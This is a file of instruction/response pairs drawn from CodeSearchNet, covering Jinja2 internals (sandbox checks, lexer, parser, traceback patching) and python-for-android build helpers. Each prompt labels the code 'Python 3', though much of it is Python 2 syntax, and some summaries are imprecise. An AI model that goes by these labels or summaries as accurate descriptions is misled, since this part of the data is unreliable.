{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef macro_body(self, node, frame, children=None):\n        frame = self.function_scoping(node, frame, children)\n        # macros are delayed, they never require output checks\n        frame.require_output_check = False\n        args = frame.arguments\n        # XXX: this is an ugly fix for the loop nesting bug\n        # (tests.test_old_bugs.test_loop_call_bug).  This works around\n        # a identifier nesting problem we have in general.  It's just more\n        # likely to happen in loops which is why we work around it.  The\n        # real solution would be \"nonlocal\" all the identifiers that are\n        # leaking into a new python frame and might be used both unassigned\n        # and assigned.\n        if 'loop' in frame.identifiers.declared:\n            args = args + ['l_loop=l_loop']\n        self.writeline('def macro(%s):' % ', '.join(args), node)\n        self.indent()\n        self.buffer(frame)\n        self.pull_locals(frame)\n        self.blockvisit(node.body, frame)\n        self.return_buffer_contents(frame)\n        self.outdent()\n        return frame", "response": "Dump the function def of a macro or call block."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndump the macro definition for the def created by macro_body.", "response": "def macro_def(self, node, frame):\n        \"\"\"Dump the macro definition for the def created by macro_body.\"\"\"\n        arg_tuple = ', '.join(repr(x.name) for x in node.args)\n        name = getattr(node, 'name', None)\n        if len(node.args) == 1:\n            arg_tuple += ','\n        self.write('Macro(environment, macro, %r, (%s), (' %\n                   (name, arg_tuple))\n        for arg in node.defaults:\n            self.visit(arg, frame)\n            self.write(', ')\n        self.write('), %r, %r, %r)' % (\n            bool(frame.accesses_kwargs),\n            bool(frame.accesses_varargs),\n            bool(frame.accesses_caller)\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef visit_Block(self, node, frame):\n        level = 1\n        if frame.toplevel:\n            # if we know that we are a child template, there is no need to\n            # check if we are one\n            if self.has_known_extends:\n                return\n            if self.extends_so_far > 0:\n                self.writeline('if parent_template is None:')\n                self.indent()\n                level += 1\n        context = node.scoped and 'context.derived(locals())' or 'context'\n        self.writeline('for event in context.blocks[%r][0](%s):' % (\n                       node.name, context), node)\n        self.indent()\n        self.simple_write('event', frame)\n        self.outdent(level)", "response": "Call a block and register it for the template."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef safe_range(*args):\n    rng = xrange(*args)\n    if len(rng) > MAX_RANGE:\n        raise OverflowError('range too big, maximum size for range is %d' %\n                            MAX_RANGE)\n    return rng", "response": "A range that can t generate more than MAX_RANGE items."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_internal_attribute(obj, attr):\n    if isinstance(obj, FunctionType):\n        if attr in UNSAFE_FUNCTION_ATTRIBUTES:\n            return True\n    elif isinstance(obj, MethodType):\n        if attr in UNSAFE_FUNCTION_ATTRIBUTES or \\\n           attr in UNSAFE_METHOD_ATTRIBUTES:\n            return True\n    elif isinstance(obj, type):\n        if attr == 'mro':\n            return True\n    elif isinstance(obj, (CodeType, TracebackType, FrameType)):\n        return True\n    elif isinstance(obj, GeneratorType):\n        if attr == 'gi_frame':\n            return True\n    return attr.startswith('__')", "response": "Test if the attribute given is an internal python attribute."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsubscribing an object from sandboxed code.", "response": "def getitem(self, obj, argument):\n        \"\"\"Subscribe an object from sandboxed code.\"\"\"\n        try:\n            return obj[argument]\n        except (TypeError, LookupError):\n            if isinstance(argument, basestring):\n                try:\n                    attr = str(argument)\n                except:\n                    pass\n                else:\n                    try:\n                        value = getattr(obj, attr)\n                    except AttributeError:\n                        pass\n                    else:\n                        if self.is_safe_attribute(obj, argument, value):\n                            return value\n                        return self.unsafe_undefined(obj, argument)\n        return self.undefined(obj=obj, name=argument)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef call(__self, __context, __obj, *args, **kwargs):\n        # the double prefixes are to avoid double keyword argument\n        # errors when proxying the call.\n        if not __self.is_safe_callable(__obj):\n            raise SecurityError('%r is not safely callable' % (__obj,))\n        return __context.call(__obj, *args, **kwargs)", "response": "Call an object from sandboxed code."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef open_if_exists(filename, mode='rb'):\n    try:\n        return open(filename, mode)\n    except IOError, e:\n        if e.errno not in (errno.ENOENT, errno.EISDIR):\n            raise", "response": "Returns a file descriptor for the filename if that file exists otherwise None."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the name of the object s type.", "response": "def object_type_repr(obj):\n    \"\"\"Returns the name of the object's type.  For some recognized\n    singletons the name of the object is returned instead. (For\n    example for `None` and `Ellipsis`).\n    \"\"\"\n    if obj is None:\n        return 'None'\n    elif obj is Ellipsis:\n        return 'Ellipsis'\n    if obj.__class__.__module__ == '__builtin__':\n        name = obj.__class__.__name__\n    else:\n        name = obj.__class__.__module__ + '.' + obj.__class__.__name__\n    return '%s object' % name"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef urlize(text, trim_url_limit=None, nofollow=False):\n    trim_url = lambda x, limit=trim_url_limit: limit is not None \\\n                         and (x[:limit] + (len(x) >=limit and '...'\n                         or '')) or x\n    words = _word_split_re.split(unicode(escape(text)))\n    nofollow_attr = nofollow and ' rel=\"nofollow\"' or ''\n    for i, word in enumerate(words):\n        match = _punctuation_re.match(word)\n        if match:\n            lead, middle, trail = match.groups()\n            if middle.startswith('www.') or (\n                '@' not in middle and\n                not middle.startswith('http://') and\n                len(middle) > 0 and\n                middle[0] in _letters + _digits and (\n                    middle.endswith('.org') or\n                    middle.endswith('.net') or\n                    middle.endswith('.com')\n                )):\n                middle = '<a href=\"http://%s\"%s>%s</a>' % (middle,\n                    nofollow_attr, trim_url(middle))\n            if middle.startswith('http://') or \\\n               middle.startswith('https://'):\n                middle = '<a href=\"%s\"%s>%s</a>' % (middle,\n                    nofollow_attr, trim_url(middle))\n            if '@' in middle and not middle.startswith('www.') and \\\n               not ':' in middle and _simple_email_re.match(middle):\n                middle = '<a href=\"mailto:%s\">%s</a>' % (middle, middle)\n            if lead + middle + trail != word:\n                words[i] = lead + middle + trail\n    return u''.join(words)", "response": "Converts any URLs in text into clickable links."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating some lorem impsum for the template.", "response": "def generate_lorem_ipsum(n=5, html=True, min=20, max=100):\n    \"\"\"Generate some lorem impsum for the template.\"\"\"\n    from jinja2.constants import LOREM_IPSUM_WORDS\n    from random import choice, randrange\n    words = LOREM_IPSUM_WORDS.split()\n    result = []\n\n    for _ in xrange(n):\n        next_capitalized = True\n        last_comma = last_fullstop = 0\n        word = None\n        last = None\n        p = []\n\n        # each paragraph contains out of 20 to 100 words.\n        for idx, _ in enumerate(xrange(randrange(min, max))):\n            while True:\n                word = choice(words)\n                if word != last:\n                    last = word\n                    break\n            if next_capitalized:\n                word = word.capitalize()\n                next_capitalized = False\n            # add commas\n            if idx - randrange(3, 8) > last_comma:\n                last_comma = idx\n                last_fullstop += 2\n                word += ','\n            # add end of sentences\n            if idx - randrange(10, 20) > last_fullstop:\n                last_comma = last_fullstop = idx\n                word += '.'\n                next_capitalized = True\n            p.append(word)\n\n        # ensure that the paragraph ends with a dot.\n        p = u' '.join(p)\n        if p.endswith(','):\n            p = p[:-1] + '.'\n        elif not p.endswith('.'):\n            p += '.'\n        result.append(p)\n\n    if not html:\n        return u'\\n\\n'.join(result)\n    return Markup(u'\\n'.join(u'<p>%s</p>' % escape(x) for x in result))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _remove(self, obj):\n        for idx, item in enumerate(self._queue):\n            if item == obj:\n                del self._queue[idx]\n                break", "response": "Remove an item from the queue."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngoes one item ahead and returns it.", "response": "def next(self):\n        \"\"\"Goes one item ahead and returns it.\"\"\"\n        rv = self.current\n        self.pos = (self.pos + 1) % len(self.items)\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nscanning directories recursively until find any file with the given lib_extension.", "response": "def get_lib_from(search_directory, lib_extension='.so'):\n    '''Scan directories recursively until find any file with the given\n    extension. The default extension to search is ``.so``.'''\n    for root, dirs, files in walk(search_directory):\n        for file in files:\n            if file.endswith(lib_extension):\n                print('get_lib_from: {}\\n\\t- {}'.format(\n                    search_directory, join(root, file)))\n                return join(root, file)\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nparse an assign statement.", "response": "def parse_set(self):\n        \"\"\"Parse an assign statement.\"\"\"\n        lineno = next(self.stream).lineno\n        target = self.parse_assign_target()\n        self.stream.expect('assign')\n        expr = self.parse_tuple()\n        return nodes.Assign(target, expr, lineno=lineno)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nparses an assignment target.", "response": "def parse_assign_target(self, with_tuple=True, name_only=False,\n                            extra_end_rules=None):\n        \"\"\"Parse an assignment target.  As Jinja2 allows assignments to\n        tuples, this function can parse all allowed assignment targets.  Per\n        default assignments to tuples are parsed, that can be disable however\n        by setting `with_tuple` to `False`.  If only assignments to names are\n        wanted `name_only` can be set to `True`.  The `extra_end_rules`\n        parameter is forwarded to the tuple parsing function.\n        \"\"\"\n        if name_only:\n            token = self.stream.expect('name')\n            target = nodes.Name(token.value, 'store', lineno=token.lineno)\n        else:\n            if with_tuple:\n                target = self.parse_tuple(simplified=True,\n                                          extra_end_rules=extra_end_rules)\n            else:\n                target = self.parse_primary(with_postfix=False)\n            target.set_ctx('store')\n        if not target.can_assign():\n            self.fail('can\\'t assign to %r' % target.__class__.\n                      __name__.lower(), target.lineno)\n        return target"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nparsing a tuple from the current line and returns the first element.", "response": "def parse_tuple(self, simplified=False, with_condexpr=True,\n                    extra_end_rules=None, explicit_parentheses=False):\n        \"\"\"Works like `parse_expression` but if multiple expressions are\n        delimited by a comma a :class:`~jinja2.nodes.Tuple` node is created.\n        This method could also return a regular expression instead of a tuple\n        if no commas where found.\n\n        The default parsing mode is a full tuple.  If `simplified` is `True`\n        only names and literals are parsed.  The `no_condexpr` parameter is\n        forwarded to :meth:`parse_expression`.\n\n        Because tuples do not require delimiters and may end in a bogus comma\n        an extra hint is needed that marks the end of a tuple.  For example\n        for loops support tuples between `for` and `in`.  In that case the\n        `extra_end_rules` is set to ``['name:in']``.\n\n        `explicit_parentheses` is true if the parsing was triggered by an\n        expression in parentheses.  This is used to figure out if an empty\n        tuple is a valid expression or not.\n        \"\"\"\n        lineno = self.stream.current.lineno\n        if simplified:\n            parse = lambda: self.parse_primary(with_postfix=False)\n        elif with_condexpr:\n            parse = self.parse_expression\n        else:\n            parse = lambda: self.parse_expression(with_condexpr=False)\n        args = []\n        is_tuple = False\n        while 1:\n            if args:\n                self.stream.expect('comma')\n            if self.is_tuple_end(extra_end_rules):\n                break\n            args.append(parse())\n            if self.stream.current.type == 'comma':\n                is_tuple = True\n            else:\n                break\n            lineno = self.stream.current.lineno\n\n        if not is_tuple:\n            if args:\n                return args[0]\n\n            # if we don't have explicit parentheses, an empty tuple is\n            # not a valid expression.  This would mean nothing (literally\n            # nothing) in the spot of an expression would be an empty\n            # tuple.\n            if not explicit_parentheses:\n                self.fail('Expected an expression, got \\'%s\\'' %\n                          describe_token(self.stream.current))\n\n        return nodes.Tuple(args, 'load', lineno=lineno)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a new instance of the class Distribution with the specified name recipes and optional extra directories.", "response": "def get_distribution(cls, ctx, name=None, recipes=[],\n                         ndk_api=None,\n                         force_build=False,\n                         extra_dist_dirs=[],\n                         require_perfect_match=False,\n                         allow_replace_dist=True):\n        '''Takes information about the distribution, and decides what kind of\n        distribution it will be.\n\n        If parameters conflict (e.g. a dist with that name already\n        exists, but doesn't have the right set of recipes),\n        an error is thrown.\n\n        Parameters\n        ----------\n        name : str\n            The name of the distribution. If a dist with this name already '\n            exists, it will be used.\n        recipes : list\n            The recipes that the distribution must contain.\n        force_download: bool\n            If True, only downloaded dists are considered.\n        force_build : bool\n            If True, the dist is forced to be built locally.\n        extra_dist_dirs : list\n            Any extra directories in which to search for dists.\n        require_perfect_match : bool\n            If True, will only match distributions with precisely the\n            correct set of recipes.\n        allow_replace_dist : bool\n            If True, will allow an existing dist with the specified\n            name but incompatible requirements to be overwritten by\n            a new one with the current requirements.\n        '''\n\n        existing_dists = Distribution.get_distributions(ctx)\n\n        possible_dists = existing_dists\n\n        name_match_dist = None\n\n        # 0) Check if a dist with that name already exists\n        if name is not None and name:\n            possible_dists = [d for d in possible_dists if d.name == name]\n            if possible_dists:\n                name_match_dist = possible_dists[0]\n\n        # 1) Check if any existing dists meet the requirements\n        _possible_dists = []\n        for dist in possible_dists:\n            if (\n                ndk_api is not None and dist.ndk_api != ndk_api\n            ) or dist.ndk_api is None:\n                continue\n            for recipe in recipes:\n                if recipe not in dist.recipes:\n                    break\n            else:\n                _possible_dists.append(dist)\n        possible_dists = _possible_dists\n\n        if possible_dists:\n            info('Of the existing distributions, the following meet '\n                 'the given requirements:')\n            pretty_log_dists(possible_dists)\n        else:\n            info('No existing dists meet the given requirements!')\n\n        # If any dist has perfect recipes and ndk API, return it\n        for dist in possible_dists:\n            if force_build:\n                continue\n            if ndk_api is not None and dist.ndk_api != ndk_api:\n                continue\n            if (set(dist.recipes) == set(recipes) or\n                (set(recipes).issubset(set(dist.recipes)) and\n                 not require_perfect_match)):\n                info_notify('{} has compatible recipes, using this one'\n                            .format(dist.name))\n                return dist\n\n        assert len(possible_dists) < 2\n\n        # If there was a name match but we didn't already choose it,\n        # then the existing dist is incompatible with the requested\n        # configuration and the build cannot continue\n        if name_match_dist is not None and not allow_replace_dist:\n            raise BuildInterruptingException(\n                'Asked for dist with name {name} with recipes ({req_recipes}) and '\n                'NDK API {req_ndk_api}, but a dist '\n                'with this name already exists and has either incompatible recipes '\n                '({dist_recipes}) or NDK API {dist_ndk_api}'.format(\n                    name=name,\n                    req_ndk_api=ndk_api,\n                    dist_ndk_api=name_match_dist.ndk_api,\n                    req_recipes=', '.join(recipes),\n                    dist_recipes=', '.join(name_match_dist.recipes)))\n\n        # If we got this far, we need to build a new dist\n        dist = Distribution(ctx)\n        dist.needs_build = True\n\n        if not name:\n            filen = 'unnamed_dist_{}'\n            i = 1\n            while exists(join(ctx.dist_dir, filen.format(i))):\n                i += 1\n            name = filen.format(i)\n\n        dist.name = name\n        dist.dist_dir = join(ctx.dist_dir, dist.name)\n        dist.recipes = recipes\n        dist.ndk_api = ctx.ndk_api\n\n        return dist"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_distributions(cls, ctx, extra_dist_dirs=[]):\n        '''Returns all the distributions found locally.'''\n        if extra_dist_dirs:\n            raise BuildInterruptingException(\n                'extra_dist_dirs argument to get_distributions '\n                'is not yet implemented')\n        dist_dir = ctx.dist_dir\n        folders = glob.glob(join(dist_dir, '*'))\n        for dir in extra_dist_dirs:\n            folders.extend(glob.glob(join(dir, '*')))\n\n        dists = []\n        for folder in folders:\n            if exists(join(folder, 'dist_info.json')):\n                with open(join(folder, 'dist_info.json')) as fileh:\n                    dist_info = json.load(fileh)\n                dist = cls(ctx)\n                dist.name = folder.split('/')[-1]\n                dist.dist_dir = folder\n                dist.needs_build = False\n                dist.recipes = dist_info['recipes']\n                if 'archs' in dist_info:\n                    dist.archs = dist_info['archs']\n                if 'ndk_api' in dist_info:\n                    dist.ndk_api = dist_info['ndk_api']\n                else:\n                    dist.ndk_api = None\n                    warning(\n                        \"Distribution {distname}: ({distdir}) has been \"\n                        \"built with an unknown api target, ignoring it, \"\n                        \"you might want to delete it\".format(\n                            distname=dist.name,\n                            distdir=dist.dist_dir\n                        )\n                    )\n                dists.append(dist)\n        return dists", "response": "Returns all the distributions found locally."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef save_info(self, dirn):\n        '''\n        Save information about the distribution in its dist_dir.\n        '''\n        with current_directory(dirn):\n            info('Saving distribution info')\n            with open('dist_info.json', 'w') as fileh:\n                json.dump({'dist_name': self.ctx.dist_name,\n                           'bootstrap': self.ctx.bootstrap.name,\n                           'archs': [arch.arch for arch in self.ctx.archs],\n                           'ndk_api': self.ctx.ndk_api,\n                           'use_setup_py': self.ctx.use_setup_py,\n                           'recipes': self.ctx.recipe_build_order + self.ctx.python_modules,\n                           'hostpython': self.ctx.hostpython,\n                           'python_version': self.ctx.python_recipe.major_minor_version_string},\n                          fileh)", "response": "Save information about the distribution in dist_dir."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nload bytecode from a file or file - like object.", "response": "def load_bytecode(self, f):\n        \"\"\"Loads bytecode from a file or file like object.\"\"\"\n        # make sure the magic header is correct\n        magic = f.read(len(bc_magic))\n        if magic != bc_magic:\n            self.reset()\n            return\n        # the source code of the file changed, we need to reload\n        checksum = pickle.load(f)\n        if self.checksum != checksum:\n            self.reset()\n            return\n        # now load the code.  Because marshal is not able to load\n        # from arbitrary streams we have to work around that\n        if isinstance(f, file):\n            self.code = marshal.load(f)\n        else:\n            self.code = marshal.loads(f.read())"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef write_bytecode(self, f):\n        if self.code is None:\n            raise TypeError('can\\'t write empty bucket')\n        f.write(bc_magic)\n        pickle.dump(self.checksum, f, 2)\n        if isinstance(f, file):\n            marshal.dump(self.code, f)\n        else:\n            f.write(marshal.dumps(self.code))", "response": "Dump the bytecode into the file or file like object passed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nautomate the installation of a Python package or a cython package where the cython components are pre - built.", "response": "def install_python_package(self, arch, name=None, env=None, is_dir=True):\n        '''Automate the installation of a Python package (or a cython\n        package where the cython components are pre-built).'''\n        if env is None:\n            env = self.get_recipe_env(arch)\n\n        with current_directory(self.get_build_dir(arch.arch)):\n            hostpython = sh.Command(self.ctx.hostpython)\n\n            shprint(hostpython, 'setup.py', 'build_ext', '--static-libpq',\n                    _env=env)\n            shprint(hostpython, 'setup.py', 'install', '-O2',\n                    '--root={}'.format(self.ctx.get_python_install_dir()),\n                    '--install-lib=.', _env=env)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef translate_exception(exc_info, initial_skip=0):\n    tb = exc_info[2]\n    frames = []\n\n    # skip some internal frames if wanted\n    for x in xrange(initial_skip):\n        if tb is not None:\n            tb = tb.tb_next\n    initial_tb = tb\n\n    while tb is not None:\n        # skip frames decorated with @internalcode.  These are internal\n        # calls we can't avoid and that are useless in template debugging\n        # output.\n        if tb.tb_frame.f_code in internal_code:\n            tb = tb.tb_next\n            continue\n\n        # save a reference to the next frame if we override the current\n        # one with a faked one.\n        next = tb.tb_next\n\n        # fake template exceptions\n        template = tb.tb_frame.f_globals.get('__jinja_template__')\n        if template is not None:\n            lineno = template.get_corresponding_lineno(tb.tb_lineno)\n            tb = fake_exc_info(exc_info[:2] + (tb,), template.filename,\n                               lineno)[2]\n\n        frames.append(TracebackFrameProxy(tb))\n        tb = next\n\n    # if we don't have any exceptions in the frames left, we have to\n    # reraise it unchanged.\n    # XXX: can we backup here?  when could this happen?\n    if not frames:\n        raise exc_info[0], exc_info[1], exc_info[2]\n\n    traceback = ProcessedTraceback(exc_info[0], exc_info[1], frames)\n    if tb_set_next is not None:\n        traceback.chain_frames()\n    return traceback", "response": "Translate an exception into a new traceback."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _init_ugly_crap():\n    import ctypes\n    from types import TracebackType\n\n    # figure out side of _Py_ssize_t\n    if hasattr(ctypes.pythonapi, 'Py_InitModule4_64'):\n        _Py_ssize_t = ctypes.c_int64\n    else:\n        _Py_ssize_t = ctypes.c_int\n\n    # regular python\n    class _PyObject(ctypes.Structure):\n        pass\n    _PyObject._fields_ = [\n        ('ob_refcnt', _Py_ssize_t),\n        ('ob_type', ctypes.POINTER(_PyObject))\n    ]\n\n    # python with trace\n    if object.__basicsize__ != ctypes.sizeof(_PyObject):\n        class _PyObject(ctypes.Structure):\n            pass\n        _PyObject._fields_ = [\n            ('_ob_next', ctypes.POINTER(_PyObject)),\n            ('_ob_prev', ctypes.POINTER(_PyObject)),\n            ('ob_refcnt', _Py_ssize_t),\n            ('ob_type', ctypes.POINTER(_PyObject))\n        ]\n\n    class _Traceback(_PyObject):\n        pass\n    _Traceback._fields_ = [\n        ('tb_next', ctypes.POINTER(_Traceback)),\n        ('tb_frame', ctypes.POINTER(_PyObject)),\n        ('tb_lasti', ctypes.c_int),\n        ('tb_lineno', ctypes.c_int)\n    ]\n\n    def tb_set_next(tb, next):\n        \"\"\"Set the tb_next attribute of a traceback object.\"\"\"\n        if not (isinstance(tb, TracebackType) and\n                (next is None or isinstance(next, TracebackType))):\n            raise TypeError('tb_set_next arguments must be traceback objects')\n        obj = _Traceback.from_address(id(tb))\n        if tb.tb_next is not None:\n            old = _Traceback.from_address(id(tb.tb_next))\n            old.ob_refcnt -= 1\n        if next is None:\n            obj.tb_next = ctypes.POINTER(_Traceback)()\n        else:\n            next = _Traceback.from_address(id(next))\n            next.ob_refcnt += 1\n            obj.tb_next = ctypes.pointer(next)\n\n    return tb_set_next", "response": "This function implements a few ugly things so that we can patch the traceback objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchains the frames. Requires ctypes or the speedups extension.", "response": "def chain_frames(self):\n        \"\"\"Chains the frames.  Requires ctypes or the speedups extension.\"\"\"\n        prev_tb = None\n        for tb in self.frames:\n            if prev_tb is not None:\n                prev_tb.tb_next = tb\n            prev_tb = tb\n        prev_tb.tb_next = None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef compile_rules(environment):\n    e = re.escape\n    rules = [\n        (len(environment.comment_start_string), 'comment',\n         e(environment.comment_start_string)),\n        (len(environment.block_start_string), 'block',\n         e(environment.block_start_string)),\n        (len(environment.variable_start_string), 'variable',\n         e(environment.variable_start_string))\n    ]\n\n    if environment.line_statement_prefix is not None:\n        rules.append((len(environment.line_statement_prefix), 'linestatement',\n                      r'^\\s*' + e(environment.line_statement_prefix)))\n    if environment.line_comment_prefix is not None:\n        rules.append((len(environment.line_comment_prefix), 'linecomment',\n                      r'(?:^|(?<=\\S))[^\\S\\r\\n]*' +\n                      e(environment.line_comment_prefix)))\n\n    return [x[1:] for x in sorted(rules, reverse=True)]", "response": "Compiles all the rules from the environment into a list of rules."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nlooks at the next token.", "response": "def look(self):\n        \"\"\"Look at the next token.\"\"\"\n        old_token = next(self)\n        result = self.current\n        self.push(result)\n        self.current = old_token\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef next(self):\n        rv = self.current\n        if self._pushed:\n            self.current = self._pushed.popleft()\n        elif self.current.type is not TOKEN_EOF:\n            try:\n                self.current = self._next()\n            except StopIteration:\n                self.close()\n        return rv", "response": "Go one token ahead and return the old one"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef expect(self, expr):\n        if not self.current.test(expr):\n            expr = describe_token_expr(expr)\n            if self.current.type is TOKEN_EOF:\n                raise TemplateSyntaxError('unexpected end of template, '\n                                          'expected %r.' % expr,\n                                          self.current.lineno,\n                                          self.name, self.filename)\n            raise TemplateSyntaxError(\"expected token %r, got %r\" %\n                                      (expr, describe_token(self.current)),\n                                      self.current.lineno,\n                                      self.name, self.filename)\n        try:\n            return self.current\n        finally:\n            next(self)", "response": "Expect a given token type and return it."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef tokeniter(self, source, name, filename=None, state=None):\n        source = '\\n'.join(unicode(source).splitlines())\n        pos = 0\n        lineno = 1\n        stack = ['root']\n        if state is not None and state != 'root':\n            assert state in ('variable', 'block'), 'invalid state'\n            stack.append(state + '_begin')\n        else:\n            state = 'root'\n        statetokens = self.rules[stack[-1]]\n        source_length = len(source)\n\n        balancing_stack = []\n\n        while 1:\n            # tokenizer loop\n            for regex, tokens, new_state in statetokens:\n                m = regex.match(source, pos)\n                # if no match we try again with the next rule\n                if m is None:\n                    continue\n\n                # we only match blocks and variables if brances / parentheses\n                # are balanced. continue parsing with the lower rule which\n                # is the operator rule. do this only if the end tags look\n                # like operators\n                if balancing_stack and \\\n                   tokens in ('variable_end', 'block_end',\n                              'linestatement_end'):\n                    continue\n\n                # tuples support more options\n                if isinstance(tokens, tuple):\n                    for idx, token in enumerate(tokens):\n                        # failure group\n                        if token.__class__ is Failure:\n                            raise token(lineno, filename)\n                        # bygroup is a bit more complex, in that case we\n                        # yield for the current token the first named\n                        # group that matched\n                        elif token == '#bygroup':\n                            for key, value in m.groupdict().iteritems():\n                                if value is not None:\n                                    yield lineno, key, value\n                                    lineno += value.count('\\n')\n                                    break\n                            else:\n                                raise RuntimeError('%r wanted to resolve '\n                                                   'the token dynamically'\n                                                   ' but no group matched'\n                                                   % regex)\n                        # normal group\n                        else:\n                            data = m.group(idx + 1)\n                            if data or token not in ignore_if_empty:\n                                yield lineno, token, data\n                            lineno += data.count('\\n')\n\n                # strings as token just are yielded as it.\n                else:\n                    data = m.group()\n                    # update brace/parentheses balance\n                    if tokens == 'operator':\n                        if data == '{':\n                            balancing_stack.append('}')\n                        elif data == '(':\n                            balancing_stack.append(')')\n                        elif data == '[':\n                            balancing_stack.append(']')\n                        elif data in ('}', ')', ']'):\n                            if not balancing_stack:\n                                raise TemplateSyntaxError('unexpected \\'%s\\'' %\n                                                          data, lineno, name,\n                                                          filename)\n                            expected_op = balancing_stack.pop()\n                            if expected_op != data:\n                                raise TemplateSyntaxError('unexpected \\'%s\\', '\n                                                          'expected \\'%s\\'' %\n                                                          (data, expected_op),\n                                                          lineno, name,\n                                                          filename)\n                    # yield items\n                    if data or tokens not in ignore_if_empty:\n                        yield lineno, tokens, data\n                    lineno += data.count('\\n')\n\n                # fetch new position into new variable so that we can check\n                # if there is a internal parsing error which would result\n                # in an infinite loop\n                pos2 = m.end()\n\n                # handle state changes\n                if new_state is not None:\n                    # remove the uppermost state\n                    if new_state == '#pop':\n                        stack.pop()\n                    # resolve the new state by group checking\n                    elif new_state == '#bygroup':\n                        for key, value in m.groupdict().iteritems():\n                            if value is not None:\n                                stack.append(key)\n                                break\n                        else:\n                            raise RuntimeError('%r wanted to resolve the '\n                                               'new state dynamically but'\n                                               ' no group matched' %\n                                               regex)\n                    # direct state name given\n                    else:\n                        stack.append(new_state)\n                    statetokens = self.rules[stack[-1]]\n                # we are still at the same position and no stack change.\n                # this means a loop without break condition, avoid that and\n                # raise error\n                elif pos2 == pos:\n                    raise RuntimeError('%r yielded empty string without '\n                                       'stack change' % regex)\n                # publish new function and start again\n                pos = pos2\n                break\n            # if loop terminated without break we havn't found a single match\n            # either we are at the end of the file or we have a problem\n            else:\n                # end of text\n                if pos >= source_length:\n                    return\n                # something went wrong\n                raise TemplateSyntaxError('unexpected char %r at %d' %\n                                          (source[pos], pos), lineno,\n                                          name, filename)", "response": "This method tokenizes the text and returns the tokens in a sequence."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding libgeos headers to path", "response": "def get_recipe_env(self, arch, with_flags_in_cc=True):\n        \"\"\" Add libgeos headers to path \"\"\"\n        env = super(ShapelyRecipe, self).get_recipe_env(arch, with_flags_in_cc)\n        libgeos_dir = Recipe.get_recipe('libgeos', self.ctx).get_build_dir(arch.arch)\n        env['CFLAGS'] += \" -I{}/dist/include\".format(libgeos_dir)\n        return env"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreading the NDK version from the NDK dir if possible", "response": "def read_ndk_version(ndk_dir):\n    \"\"\"Read the NDK version from the NDK dir, if possible\"\"\"\n    try:\n        with open(join(ndk_dir, 'source.properties')) as fileh:\n            ndk_data = fileh.read()\n    except IOError:\n        info('Could not determine NDK version, no source.properties '\n             'in the NDK dir')\n        return\n\n    for line in ndk_data.split('\\n'):\n        if line.startswith('Pkg.Revision'):\n            break\n    else:\n        info('Could not parse $NDK_DIR/source.properties, not checking '\n             'NDK version')\n        return\n\n    # Line should have the form \"Pkg.Revision = ...\"\n    ndk_version = LooseVersion(line.split('=')[-1].strip())\n\n    return ndk_version"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nwarning if the user s target API is less than the current minimum availabe recommendation", "response": "def check_target_api(api, arch):\n    \"\"\"Warn if the user's target API is less than the current minimum\n    recommendation\n    \"\"\"\n\n    if api >= ARMEABI_MAX_TARGET_API and arch == 'armeabi':\n        raise BuildInterruptingException(\n            'Asked to build for armeabi architecture with API '\n            '{}, but API {} or greater does not support armeabi'.format(\n                api, ARMEABI_MAX_TARGET_API),\n            instructions='You probably want to build with --arch=armeabi-v7a instead')\n\n    if api < MIN_TARGET_API:\n        warning('Target API {} < {}'.format(api, MIN_TARGET_API))\n        warning(OLD_API_MESSAGE)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nwarning if the user s NDK is too high or low.", "response": "def check_ndk_api(ndk_api, android_api):\n    \"\"\"Warn if the user's NDK is too high or low.\"\"\"\n    if ndk_api > android_api:\n        raise BuildInterruptingException(\n            'Target NDK API is {}, higher than the target Android API {}.'.format(\n                ndk_api, android_api),\n            instructions=('The NDK API is a minimum supported API number and must be lower '\n                          'than the target Android API'))\n\n    if ndk_api < MIN_NDK_API:\n        warning(OLD_NDK_API_MESSAGE)"}
